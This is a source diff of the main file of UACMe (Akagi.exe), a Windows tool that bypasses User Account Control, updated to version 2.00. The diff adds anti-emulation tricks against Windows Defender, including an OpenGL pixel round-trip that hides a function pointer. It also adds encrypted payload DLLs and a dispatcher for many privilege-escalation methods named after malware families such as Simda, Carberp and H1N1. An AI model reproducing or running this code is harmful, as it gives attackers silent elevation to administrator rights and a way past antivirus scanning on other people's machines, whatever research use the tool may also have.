@@ -1,14 +1,14 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2014 - 2015
+*  (C) COPYRIGHT AUTHORS, 2014 - 2016
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.93
+*  VERSION:     2.00
 *
-*  DATE:        05 Nov 2015
+*  DATE:        16 Nov 2015
 *
-*  Injector entry point.
+*  Program entry point.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -16,23 +16,15 @@
 * PARTICULAR PURPOSE.
 *
 *******************************************************************************/
-
+#define OEMRESOURCE
 #include "global.h"
 #include <VersionHelpers.h>
+#include <gl\GL.h>
+#pragma comment(lib, "opengl32.lib")
 
-ELOAD_PARAM_GLOBAL g_ldp;
+UACMECONTEXT g_ctx;
 
-#ifdef _WIN64
-#include "hibiki64.h"
-#include "fubuki64.h"
-#define INJECTDLL Fubuki64
-#define AVRFDLL	Hibiki64
-#else
-#include "hibiki32.h"
-#include "fubuki32.h"
-#define INJECTDLL Fubuki32
-#define AVRFDLL Hibiki32
-#endif
+static pfnDecompressPayload pDecryptPayload = NULL;
 
 #if (_MSC_VER >= 1900) 
 #ifdef _DEBUG
@@ -43,98 +35,221 @@ ELOAD_PARAM_GLOBAL g_ldp;
 #endif
 #endif
 
-#define PROGRAMTITLE TEXT("UACMe")
-#define WOW64STRING TEXT("Apparently it seems you are running under WOW64.\n\r\
-This is not supported, run x64 version of this tool.")
-#define WOW64WIN32ONLY TEXT("This method only works from x86-32 Windows or Wow64")
-#define LAZYWOW64UNSUPPORTED TEXT("Use 32 bit version of this tool on 32 bit OS version")
-
-#define UACFIX TEXT("This method fixed/unavailable in the current version of Windows, do you still want to continue?")
-
 /*
-* ucmShowMessage
+* DummyWindowProc
 *
 * Purpose:
 *
-* Output message to user.
+* Part of antiemulation, does nothing, serves as a window for ogl operations.
 *
 */
-VOID ucmShowMessage(
-	LPWSTR lpszMsg
+LRESULT CALLBACK DummyWindowProc(
+	HWND hwnd, 
+	UINT uMsg, 
+	WPARAM wParam, 
+	LPARAM lParam
 	)
 {
-	if (lpszMsg) {
-		MessageBoxW(GetDesktopWindow(), 
-			lpszMsg, PROGRAMTITLE, MB_ICONINFORMATION);
+	switch (uMsg) {
+	case WM_CLOSE:
+		PostQuitMessage(0);
+		break;
 	}
+	return DefWindowProc(hwnd, uMsg, wParam, lParam);
 }
-
-/*
-* ucmShowQuestion
-*
-* Purpose:
-*
-* Output message with question to user.
-*
-*/
-INT ucmShowQuestion(
-	LPWSTR lpszMsg
-	)
-{
-	return MessageBoxW(GetDesktopWindow(), lpszMsg, PROGRAMTITLE, MB_YESNO);
-}
-
 
 /*
 * ucmInit
 *
 * Purpose:
 *
-* Prestart phase.
+* Prestart phase with MSE / Windows Defender anti-emulation part.
 *
 */
 UINT ucmInit(
 	VOID
 	)
 {
-	//fill common data block
-	RtlSecureZeroMemory(&g_ldp, sizeof(g_ldp));
+	BOOL cond = FALSE;
+	DWORD Result = ERROR_SUCCESS;
+	PVOID       Ptr;
+	MSG         msg1;
+	WNDCLASSEX  wincls;
+	HINSTANCE   inst = GetModuleHandle(NULL);
+	BOOL        rv = 1;
+	HWND        TempWindow;
+	HGLRC       ctx;
+	HDC         dc1;
+	int         index;
+#ifndef _DEBUG
+	TOKEN_ELEVATION_TYPE    ElevType;
+#endif	
 
-	//remember dll handles
-	g_ldp.hKernel32 = GetModuleHandleW(L"kernel32.dll");
-	if (g_ldp.hKernel32 == NULL) {
-		return ERROR_INVALID_HANDLE;
-	}
-	g_ldp.hOle32 = GetModuleHandleW(L"ole32.dll");
-	if (g_ldp.hOle32 == NULL) {
-		g_ldp.hOle32 = LoadLibraryW(L"ole32.dll");
-		if (g_ldp.hOle32 == NULL) {
-			return ERROR_INVALID_HANDLE;
+	ULONG bytesIO, dwType;
+	WCHAR szBuffer[MAX_PATH + 1];
+	WCHAR WndClassName[] = TEXT("reirraC");
+	WCHAR WndTitleName[] = TEXT("igakA");
+
+	PIXELFORMATDESCRIPTOR pfd = {
+		sizeof(PIXELFORMATDESCRIPTOR),
+		1,
+		PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL | PFD_DOUBLEBUFFER | PFD_SWAP_EXCHANGE | PFD_GENERIC_ACCELERATED,
+		PFD_TYPE_RGBA,
+		32, 8, 0, 8, 0, 8, 0, 8, 0,
+		0, 0, 0, 0, 0, 32, 0, 0,
+		PFD_MAIN_PLANE, 0, 0, 0, 0
+	};
+
+	do {
+
+		//fill common data block
+		RtlSecureZeroMemory(&g_ctx, sizeof(g_ctx));
+
+		dwType = 0;
+		bytesIO = 0;
+		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+		GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
+		if (bytesIO == 0) {
+			return ERROR_BAD_ARGUMENTS;
 		}
-	}
-	g_ldp.hShell32 = GetModuleHandleW(L"shell32.dll");
-	if (g_ldp.hShell32 == NULL) {
-		g_ldp.hShell32 = LoadLibraryW(L"shell32.dll");
-		if (g_ldp.hShell32 == NULL) {
-			return ERROR_INVALID_HANDLE;
+		g_ctx.Method = strtoul(szBuffer);
+		if (g_ctx.Method == 0 || g_ctx.Method >= UacMethodMax) {
+			return ERROR_BAD_ARGUMENTS;
 		}
-	}
 
-	//query basic directories
-	if (GetSystemDirectoryW(g_ldp.szSystemDirectory, MAX_PATH) == 0) {
-		return ERROR_INVALID_DATA;
-	}
+#ifndef _DEBUG
+		ElevType = TokenElevationTypeDefault;
+		if (supGetElevationType(&ElevType)) {
+			if (ElevType != TokenElevationTypeLimited) {			
+				return ERROR_UNSUPPORTED_TYPE;
+			}
+		}
+#endif
 
-	//query build number
-	RtlSecureZeroMemory(&g_ldp.osver, sizeof(g_ldp.osver));
-	g_ldp.osver.dwOSVersionInfoSize = sizeof(g_ldp.osver);
-	if (!NT_SUCCESS(RtlGetVersion(&g_ldp.osver))) {
-		return ERROR_INVALID_ACCESS;
-	}
+		wincls.cbSize = sizeof(WNDCLASSEX);
+		wincls.style = CS_OWNDC;
+		wincls.lpfnWndProc = &DummyWindowProc;
+		wincls.cbClsExtra = 0;
+		wincls.cbWndExtra = 0;
+		wincls.hInstance = inst;
+		wincls.hIcon = NULL;
+		wincls.hCursor = (HCURSOR)LoadImage(NULL, MAKEINTRESOURCE(OCR_NORMAL), IMAGE_CURSOR, 0, 0, LR_SHARED);
+		wincls.hbrBackground = NULL;
+		wincls.lpszMenuName = NULL;
+		wincls.lpszClassName = WndClassName;
+		wincls.hIconSm = 0;
+		RegisterClassEx(&wincls);
 
-	g_ldp.IsWow64 = supIsProcess32bit(GetCurrentProcess());
+		TempWindow = CreateWindowEx(WS_EX_TOPMOST, WndClassName, WndTitleName,
+			WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 0, 0, 30, 30, NULL, NULL, inst, NULL);
 
-	return ERROR_SUCCESS;
+
+		//remember dll handles
+		g_ctx.hKernel32 = GetModuleHandleW(T_KERNEL32);
+		if (g_ctx.hKernel32 == NULL) {
+			Result = ERROR_INVALID_HANDLE;
+			break;
+		}
+
+		g_ctx.hOle32 = GetModuleHandleW(T_OLE32);
+		if (g_ctx.hOle32 == NULL) {
+			g_ctx.hOle32 = LoadLibraryW(T_OLE32);
+			if (g_ctx.hOle32 == NULL) {
+				Result = ERROR_INVALID_HANDLE;
+				break;
+			}
+		}
+		g_ctx.hShell32 = GetModuleHandleW(T_SHELL32);
+		if (g_ctx.hShell32 == NULL) {
+			g_ctx.hShell32 = LoadLibraryW(T_SHELL32);
+			if (g_ctx.hShell32 == NULL) {
+				Result = ERROR_INVALID_HANDLE;
+				break;
+			}
+		}
+
+		//query basic directories
+		if (GetSystemDirectoryW(g_ctx.szSystemDirectory, MAX_PATH) == 0) {
+			Result = ERROR_INVALID_DATA;
+			break;
+		}
+
+		//query build number
+		RtlSecureZeroMemory(&g_ctx.osver, sizeof(g_ctx.osver));
+		g_ctx.osver.dwOSVersionInfoSize = sizeof(g_ctx.osver);
+		if (!NT_SUCCESS(RtlGetVersion(&g_ctx.osver))) {
+			Result = ERROR_INVALID_ACCESS;
+			break;
+		}
+
+		if (g_ctx.osver.dwBuildNumber < 7000) {
+			Result = ERROR_INSTALL_PLATFORM_UNSUPPORTED;
+			break;
+		}
+
+		g_ctx.IsWow64 = supIsProcess32bit(GetCurrentProcess());
+
+		//flashes and sparks
+		dc1 = GetDC(TempWindow);
+		index = ChoosePixelFormat(dc1, &pfd);
+		SetPixelFormat(dc1, index, &pfd);
+		ctx = wglCreateContext(dc1);
+		wglMakeCurrent(dc1, ctx);
+		glDrawBuffer(GL_BACK);
+		glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
+		glMatrixMode(GL_PROJECTION);
+		glLoadIdentity();
+		glBegin(GL_TRIANGLES);
+		glColor4i(1, 0, 1, 0);
+		glVertex2i(-1, -1);
+		glVertex2i(0, 1);
+		glVertex2i(1, -1);
+		glEnd();
+#pragma warning(disable: 4054)//code to data
+		Ptr = (PVOID)&DecompressPayload;
+#pragma warning(default: 4054)
+		pDecryptPayload = NULL;
+#ifdef _WIN64
+		glDrawPixels(2, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
+		glReadPixels(0, 0, 2, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecryptPayload);
+#else
+		glDrawPixels(1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
+		glReadPixels(0, 0, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecryptPayload);
+#endif
+		SwapBuffers(dc1);
+		SendMessage(TempWindow, WM_CLOSE, 0, 0);
+
+		do {
+			rv = GetMessage(&msg1, NULL, 0, 0);
+
+			if (rv == -1)
+				break;
+
+			TranslateMessage(&msg1);
+			DispatchMessage(&msg1);
+		} while (rv != 0);
+
+		UnregisterClass(WndClassName, inst);
+
+		switch (g_ctx.Method) {
+
+		case UacMethodAVrf:
+			g_ctx.PayloadDll = pDecryptPayload((PVOID)HIBIKIDLL, sizeof(HIBIKIDLL), &g_ctx.PayloadDllSize);
+			break;
+
+		default:
+			g_ctx.PayloadDll = pDecryptPayload((PVOID)FUBUKIDLL, sizeof(FUBUKIDLL), &g_ctx.PayloadDllSize);
+			break;
+		}
+
+		if (g_ctx.PayloadDll == NULL) {
+			Result = ERROR_INVALID_DATA;
+			break;
+		}
+
+	} while (cond);
+
+	return Result;
 }
 
 /*
@@ -147,150 +262,158 @@ UINT ucmInit(
 */
 UINT ucmMain()
 {
-	DWORD                   bytesIO, dwType, paramLen;
-	WCHAR                   *p;
-	WCHAR                   szBuffer[MAX_PATH + 1];
-	TOKEN_ELEVATION_TYPE    ElevType;
+	DWORD  paramLen;
+	WCHAR  *pDllName;
+	WCHAR  szBuffer[MAX_PATH + 1];
+	UINT   uResult;
 
+#ifdef GENERATE_COMPRESSED_PAYLOAD
+	CompressPayload();
+#endif
+	uResult = ucmInit();
 
-	if (ucmInit() != ERROR_SUCCESS) {
+	switch (uResult) {
+
+	case ERROR_UNSUPPORTED_TYPE:
+		ucmShowMessage(TEXT("Admin account with limited token required."));
+		break;
+
+	case ERROR_INSTALL_PLATFORM_UNSUPPORTED:
+		ucmShowMessage(TEXT("This Windows version is not supported."));
+		break;
+
+	case ERROR_BAD_ARGUMENTS:
+		ucmShowMessage(TEXT("Usage: Akagi.exe [Method] [OptionalParamToExecute]"));
+		break;
+	default:
+		break;
+
+	}
+	if (uResult != ERROR_SUCCESS) {
 		return ERROR_INTERNAL_ERROR;
 	}
 
-	//query windows version
-	if (!supIsWindowsVersionOrGreater(HIBYTE(_WIN32_WINNT_WIN7), LOBYTE(_WIN32_WINNT_WIN7), 0)) {
-		ucmShowMessage(TEXT("This Windows is unsupported."));
-		return ERROR_NOT_SUPPORTED;
-	}
-
-	ElevType = TokenElevationTypeDefault;
-	if (!supGetElevationType(&ElevType)) {
-		return ERROR_INVALID_ACCESS;
-	}
-
-	if (ElevType != TokenElevationTypeLimited) {
-		ucmShowMessage(TEXT("Admin account with limited token required."));
-		return ERROR_NOT_SUPPORTED;
-	}
-
-	dwType = 0;
-	bytesIO = 0;
-	RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-	GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
-	if (bytesIO == 0) {
-		return ERROR_INVALID_DATA;
-	}
+	//check OS version first
+	switch (g_ctx.Method) {
 	
-	dwType = strtoul(szBuffer);
-	switch (dwType) {
-
-	case METHOD_SYSPREP1://cryptbase
-		if (g_ldp.osver.dwBuildNumber > 9200) {
+	case UacMethodSysprep1://cryptbase
+		if (g_ctx.osver.dwBuildNumber > 9200) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_SYSPREP2://shcore
-		if (g_ldp.osver.dwBuildNumber != 9600) {
+	case UacMethodSysprep2://shcore
+		if (g_ctx.osver.dwBuildNumber != 9600) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_SYSPREP3://dbgcore
-		if (g_ldp.osver.dwBuildNumber != 10240)	{
+	case UacMethodSysprep3://dbgcore
+		if (g_ctx.osver.dwBuildNumber != 10240)	{
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_OOBE://oobe service
-		if (g_ldp.osver.dwBuildNumber >= 10548) {
+	case UacMethodOobe://oobe service
+		if (g_ctx.osver.dwBuildNumber >= 10548) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_REDIRECTEXE:
-		if (g_ldp.osver.dwBuildNumber > 9600) {
+	case UacMethodRedirectExe:
+#ifndef _WIN64
+		if (g_ctx.osver.dwBuildNumber > 9600) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
-
-#ifdef _WIN64
+#else 
 		ucmShowMessage(WOW64WIN32ONLY);
 		return ERROR_UNSUPPORTED_TYPE;
 #endif
 		break;
 
-	case METHOD_SIMDA:
-		if (g_ldp.osver.dwBuildNumber >= 10136) {
+	case UacMethodSimda:
+		if (g_ctx.osver.dwBuildNumber >= 10136) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_CARBERP:
-		if (g_ldp.osver.dwBuildNumber >= 10147) {
+	case UacMethodCarberp1:
+		if (g_ctx.osver.dwBuildNumber >= 10147) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_CARBERP_EX:
-		if (g_ldp.osver.dwBuildNumber >= 10147) {
+	case UacMethodCarberp2:
+		if (g_ctx.osver.dwBuildNumber >= 10147) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_TILON:
-		if (g_ldp.osver.dwBuildNumber > 9200) {
+	case UacMethodTilon:
+		if (g_ctx.osver.dwBuildNumber > 9200) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_AVRF:
-		if (g_ldp.osver.dwBuildNumber >= 10136) {
+	case UacMethodAVrf:
+		if (g_ctx.osver.dwBuildNumber >= 10136) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_WINSAT:
-		if (g_ldp.osver.dwBuildNumber >= 10548) {
+	case UacMethodWinsat:
+		if (g_ctx.osver.dwBuildNumber >= 10548) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_SHIMPATCH:
-		if (g_ldp.osver.dwBuildNumber > 9600) {
+	case UacMethodShimPatch:
+#ifndef _WIN64
+		if (g_ctx.osver.dwBuildNumber > 9600) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
-
-#ifdef _WIN64
+#else
 		ucmShowMessage(WOW64WIN32ONLY);
 		return ERROR_UNSUPPORTED_TYPE;
-#endif		
+#endif
 		break;
 
-	case METHOD_MMC:
+	case UacMethodMMC:
+#ifndef _WIN64
+		ucmShowMessage(WIN64ONLY);
+		return ERROR_UNSUPPORTED_TYPE;
+#endif	
 		break;
 
-	case METHOD_H1N1:
-		if (g_ldp.osver.dwBuildNumber >= 10548) {
+	case UacMethodH1N1:
+		if (g_ctx.osver.dwBuildNumber >= 10548) {
 			if (ucmShowQuestion(UACFIX) == IDNO)
 				return ERROR_UNSUPPORTED_TYPE;
 		}
 		break;
 
-	case METHOD_GENERIC:
+	case UacMethodGeneric:
+		//future use
 		break;
 
+	case UacMethodGWX:
+		if (g_ctx.osver.dwBuildNumber < 7600) {
+			ucmShowMessage(OSTOOOLD);
+			return ERROR_UNSUPPORTED_TYPE;
+		}
+		break;
 	}
 
 	//prepare command for payload
@@ -298,30 +421,30 @@ UINT ucmMain()
 	RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
 	GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &paramLen);
 	if (paramLen > 0) {
-		if (dwType != METHOD_REDIRECTEXE) {
+		if (g_ctx.Method != UacMethodRedirectExe) {
 			supSetParameter((LPWSTR)&szBuffer, paramLen * sizeof(WCHAR));
 		}
 	}
 
-	switch (dwType) {
 
-	case METHOD_SYSPREP1:
-	case METHOD_SYSPREP2:
-	case METHOD_SYSPREP3:
-	case METHOD_OOBE:
-	case METHOD_TILON:
+	//check environment and execute method if it met requirements
+	switch (g_ctx.Method) {
 
-		//
-		// Since we are using injection and not using heavens gate/syswow64, we should ban usage under wow64.
-		//
+	case UacMethodSysprep1:
+	case UacMethodSysprep2:
+	case UacMethodSysprep3:
+	case UacMethodOobe:
+	case UacMethodTilon:
+
 #ifndef _DEBUG
-		if (g_ldp.IsWow64) {
+		if (g_ctx.IsWow64) {
 			ucmShowMessage(WOW64STRING);
 			return ERROR_UNSUPPORTED_TYPE;
 		}
 #endif
-		if (ucmStandardAutoElevation(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
-			OutputDebugString(TEXT("[UCM] Standard AutoElevation method called\n\r"));
+		
+		if (ucmStandardAutoElevation(g_ctx.Method, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+			return ERROR_SUCCESS;
 		}
 		break;
 
@@ -329,20 +452,18 @@ UINT ucmMain()
 //  Allow only in 32 version.
 //
 #ifndef _WIN64
-	case METHOD_REDIRECTEXE:
-	case METHOD_SHIMPATCH:
-		if (ucmAppcompatElevation(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL), (paramLen != 0) ? szBuffer : NULL )) {
-			OutputDebugString(TEXT("[UCM] AppCompat method called\n\r"));
+	case UacMethodRedirectExe:
+	case UacMethodShimPatch:
+		if (ucmAppcompatElevation(g_ctx.Method, g_ctx.PayloadDll, g_ctx.PayloadDllSize, (paramLen != 0) ? szBuffer : NULL )) {
+			return ERROR_SUCCESS;
 		}
 		break;
 #endif
-	case METHOD_SIMDA:
 
-		//
-		// Since we are using injection and not using heavens gate, we should ban usage under wow64.
-		//
+	case UacMethodSimda:
+
 #ifndef _DEBUG
-		if (g_ldp.IsWow64) {
+		if (g_ctx.IsWow64) {
 			ucmShowMessage(WOW64STRING);
 			return ERROR_UNSUPPORTED_TYPE;
 		}
@@ -352,115 +473,134 @@ UINT ucmMain()
 			PROGRAMTITLE, MB_ICONQUESTION | MB_YESNO) == IDYES) 
 		{
 			if (ucmSimdaTurnOffUac()) {
-				OutputDebugString(TEXT("[UCM] Simda method called\n\r"));
+				return ERROR_SUCCESS;
 			}
 		}
 		break;
 
-	case METHOD_CARBERP:
-	case METHOD_CARBERP_EX:
+	case UacMethodCarberp1:
+	case UacMethodCarberp2:
 
-		if (dwType == METHOD_CARBERP) {
+		if (g_ctx.Method == UacMethodCarberp1) {
 
 			//there is no migmiz in syswow64 in 8+
-			if ((g_ldp.IsWow64) && (g_ldp.osver.dwBuildNumber > 7601)) {
+			if ((g_ctx.IsWow64) && (g_ctx.osver.dwBuildNumber > 7601)) {
 				ucmShowMessage(WOW64STRING);
 				return ERROR_UNSUPPORTED_TYPE;
 			}
 		}
 
-		if (dwType == METHOD_CARBERP_EX) {
+		if (g_ctx.Method == UacMethodCarberp2) {
 #ifndef _DEBUG
-			if (g_ldp.IsWow64) {
+			if (g_ctx.IsWow64) {
 				ucmShowMessage(WOW64STRING);
 				return ERROR_UNSUPPORTED_TYPE;
 			}
 #endif
 		}
 
-		if (ucmWusaMethod(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
-			OutputDebugString(TEXT("[UCM] Carberp method called\n\r"));
+		if (ucmWusaMethod(g_ctx.Method, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+			return ERROR_SUCCESS;
 		}
 		break;
 
-	case METHOD_AVRF:
+	case UacMethodAVrf:
 #ifndef _DEBUG
-		if (g_ldp.IsWow64) {
+		if (g_ctx.IsWow64) {
 			ucmShowMessage(WOW64STRING);
 			return ERROR_UNSUPPORTED_TYPE;
 		}
-#endif
-		if (ucmAvrfMethod((CONST PVOID)AVRFDLL, sizeof(AVRFDLL))) {
-			OutputDebugString(TEXT("[UCM] AVrf method called\n\r"));
-		}	
+#endif		
+		if (ucmAvrfMethod(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+			return ERROR_SUCCESS;
+		}
 		break;
 
-	case METHOD_WINSAT:
-		//
-		// Decoding WOW64 environment, turning wow64fs redirection is meeh. Just drop it as it just a test tool.
-		//
-		if (g_ldp.IsWow64) {
+	case UacMethodWinsat:
+#ifndef _DEBUG
+		if (g_ctx.IsWow64) {
 			ucmShowMessage(LAZYWOW64UNSUPPORTED);
 			return ERROR_UNSUPPORTED_TYPE;
 		}
-
-		if (g_ldp.osver.dwBuildNumber < 9200) {
-			p = L"powrprof.dll";
+#endif
+		if (g_ctx.osver.dwBuildNumber < 9200) {
+			pDllName = L"powrprof.dll";
 		}
 		else {
-			p = L"devobj.dll";
+			pDllName = L"devobj.dll";
 		}
 
-		if (ucmWinSATMethod(p, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL), (g_ldp.osver.dwBuildNumber <= 10136))) {
-			OutputDebugString(TEXT("[UCM] WinSAT method called\n\r"));
-		}
-		break;
-
-	case METHOD_MMC:
-		if (g_ldp.IsWow64) {
-			ucmShowMessage(WOW64STRING);
-			return ERROR_UNSUPPORTED_TYPE;
-		}
-		p = L"elsext.dll";
-		if (ucmMMCMethod(p, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
-			OutputDebugString(TEXT("[UCM] MMC method called\n\r"));
+		if (ucmWinSATMethod(pDllName, g_ctx.PayloadDll, g_ctx.PayloadDllSize, (g_ctx.osver.dwBuildNumber <= 10136))) {
+			return ERROR_SUCCESS;
 		}
 		break;
 
-	case METHOD_H1N1:
-		if (g_ldp.IsWow64) {
+	case UacMethodMMC:
+#ifndef _DEBUG
+		if (g_ctx.IsWow64) {
 			ucmShowMessage(WOW64STRING);
 			return ERROR_UNSUPPORTED_TYPE;
 		}
-
-		if (ucmH1N1Method((CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
-			OutputDebugString(TEXT("[UCM] H1N1 method called\n\r"));
+#endif
+		pDllName = L"elsext.dll";
+		if (ucmMMCMethod(pDllName, g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+			return ERROR_SUCCESS;
 		}
 		break;
 
-	case METHOD_GENERIC:
-		if (g_ldp.IsWow64) {
+	case UacMethodH1N1:
+#ifndef _DEBUG
+		if (g_ctx.IsWow64) {
 			ucmShowMessage(WOW64STRING);
 			return ERROR_UNSUPPORTED_TYPE;
 		}
+#endif
+		if (ucmH1N1Method(g_ctx.PayloadDll, g_ctx.PayloadDllSize)) {
+			return ERROR_SUCCESS;
+		}
+		break;
 
-		p = L"ntwdblib.dll";
+	case UacMethodGeneric:
+#ifndef _DEBUG
+		if (g_ctx.IsWow64) {
+			ucmShowMessage(WOW64STRING);
+			return ERROR_UNSUPPORTED_TYPE;
+		}
+#endif
+		pDllName = L"ntwdblib.dll";
+		if (ucmGenericAutoelevation(METHOD_SQLSRV_TARGETAPP, pDllName, g_ctx.PayloadDll, g_ctx.PayloadDllSize))
+			return ERROR_SUCCESS;
+		
+		break;
 
-		if (ucmGenericAutoelevation(
-			METHOD_SQLSRV_TARGETAPP,
-			p, 
-			(CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) 
-		{
-			OutputDebugString(TEXT("[UCM] Generic method called\n\r"));
+	case UacMethodGWX:
+#ifndef _DEBUG
+		if (g_ctx.IsWow64) {
+			ucmShowMessage(WOW64STRING);
+			return ERROR_UNSUPPORTED_TYPE;
+		}
+#endif
+		if (ucmGWX()) {
+			return ERROR_SUCCESS;
 		}
 		break;
 
 	}
 	
-	return ERROR_SUCCESS;
+	return ERROR_ACCESS_DENIED;
 }
 
 VOID main()
 {
-	ExitProcess(ucmMain());
+	UINT uResult;
+
+	uResult = ucmMain();
+	if (uResult == ERROR_SUCCESS) {
+		OutputDebugString(RESULTOK);
+	}
+	else
+	{
+		OutputDebugString(RESULTFAIL);
+	}
+	ExitProcess(uResult);
 }
